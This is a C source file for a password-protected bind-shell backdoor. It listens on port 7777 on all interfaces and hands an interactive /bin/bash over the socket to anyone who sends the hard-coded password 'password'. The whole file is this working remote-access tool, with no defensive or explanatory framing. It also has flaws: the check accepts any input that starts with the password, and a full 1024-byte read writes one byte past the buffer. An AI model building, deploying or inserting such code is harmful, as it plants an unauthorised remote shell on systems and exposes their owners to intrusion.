#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <signal.h>

#define PORT 7777
#define PASSWORD "password" // You should choose a stronger password

int main() {
    int server_fd;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[1024] = {0};
    char *password_prompt = "Password: ";

    // Ignore SIGCHLD to prevent zombie processes
    signal(SIGCHLD, SIG_IGN);

    // Create socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Bind the socket to the port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    while(1) { // Infinite loop to accept repeated connections
        int new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
        if (new_socket < 0) {
            perror("accept");
            continue; // Continue to the next iteration to keep listening
        }

        // Fork a new process to handle the connection
        if (fork() == 0) {
            // This is the child process, which will handle the connection
            close(server_fd); // Child does not need the listener

            // Send password prompt and read the response
            send(new_socket, password_prompt, strlen(password_prompt), 0);
            ssize_t bytes_read = read(new_socket, buffer, 1024);
            
            if (bytes_read > 0) {
                // Check password
                buffer[bytes_read] = '\0'; // Null-terminate the buffer to make it a string
                if (strncmp(buffer, PASSWORD, strlen(PASSWORD)) == 0) {
                    // If correct, give shell access
                    dup2(new_socket, 0);
                    dup2(new_socket, 1);
                    dup2(new_socket, 2);

                    // Execute /bin/bash
                    execl("/bin/bash", "/bin/bash", "-i", NULL);
                    perror("execl failed"); // If execl returns, it's an error
                }
            }

            // If password is incorrect or read failed, close connection
            close(new_socket);
            exit(0); // Terminate the child process
        } else {
            // This is the parent process, which continues to listen for new connections
            close(new_socket); // Parent does not need this specific client's socket
        }
    }

    // Code will not reach here, but if the while loop ever exits, close the server socket
    close(server_fd);
    return 0;
}
